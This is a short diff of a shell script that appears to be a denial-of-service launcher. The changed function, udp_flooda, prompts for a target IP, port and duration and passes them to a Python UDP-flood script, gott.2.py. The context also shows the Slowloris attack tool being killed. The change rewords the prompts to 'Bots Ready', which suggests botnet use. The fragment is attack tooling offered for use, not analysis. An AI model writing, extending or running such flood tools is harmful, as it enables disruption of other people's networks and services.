@@ -78,12 +78,12 @@ pkill slowloris
 }
 
 udp_flooda(){
-echo -en "Packets Ready
-Please Enter IP Address:"
+echo -en "Bots Ready
+IP:"
 read ip
-echo -en "Please Enter Port:"
+echo -en "Port:"
 read port
-echo -en "Please Enter Time:"
+echo -en "Time:"
 read time
 python gott.2.py ${ip} ${port} ${time} 
 }
